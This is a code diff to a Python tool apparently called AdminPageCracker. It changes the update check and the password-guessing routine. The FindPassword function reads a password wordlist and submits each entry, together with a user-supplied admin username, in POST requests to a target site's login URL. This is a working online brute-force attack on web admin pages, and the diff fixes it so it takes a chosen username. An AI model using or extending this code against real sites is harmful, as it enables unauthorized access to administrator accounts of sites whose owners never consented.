@@ -189,6 +189,7 @@ def check_for_update():
         http = urllib2.urlopen('https://raw.githubusercontent.com/HydraBoy/AdminPageCracker/master/version.txt',data=None)
         content = http.read()
         read = open('version.txt','r').read()
+        print read,content
         if read == content:
             print '[#] No updates available.'
         else:
@@ -204,10 +205,11 @@ def check_for_update():
         sys.exit(0)
 
 
-def FindPassword(word, url):
+def FindPassword(username, word, url):
     wordlist = open (word,'r').readlines()
     for line in wordlist:
         password = line.strip()
+        user = username
         http = requests.post(url, data={'username':user,'password':password,'submit':'submit'})
         content = http.content.decode('utf-8')
         print(Fore.GREEN+"[#] Checking Password: [" + str(password)+ "]")
@@ -411,7 +413,8 @@ OK, Now Enter Site Source Code.
         elif ask == '2':
             url = raw_input(Fore.GREEN+"[+] Enter Site Target\n>>> ")
             word = raw_input(Fore.GREEN+"[+] Enter Password List Directory\n>>> ")
-            FindPassword(word, url)
+            username = raw_input(Fore.GREEN+"[+] Enter Admin Page UserName: [admin]\n>>> ")
+            FindPassword(username, word, url)
         elif ask == '3':
             print "\nBye ;)\n"
             exit(0)
